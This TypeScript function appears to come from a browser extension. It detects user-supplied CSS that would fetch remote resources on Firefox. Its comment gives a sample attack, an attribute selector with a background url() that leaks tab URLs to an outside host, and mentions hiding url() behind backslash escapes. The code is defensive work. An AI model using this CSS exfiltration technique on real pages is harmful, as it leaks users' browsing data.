/**
 * Firefox's CSP allows https images (favicons), so CSS must not fetch any: a rule such as
 * `[data-url^="https://a"] { background: url(https://x/a) }` would leak tab URLs. Chrome's
 * CSP already blocks that. Backslash escapes are refused so `\75rl(` can't hide a url().
 */
export function fetchesRemote(css: string): boolean {
  if (!import.meta.env.FIREFOX) return false;
  const plain = css.replace(/\/\*[\s\S]*?\*\//g, '');
  return /\\|@import|image-set|\bsrc\(|\burl\(\s*(?!['"]?data:)/i.test(plain);
}
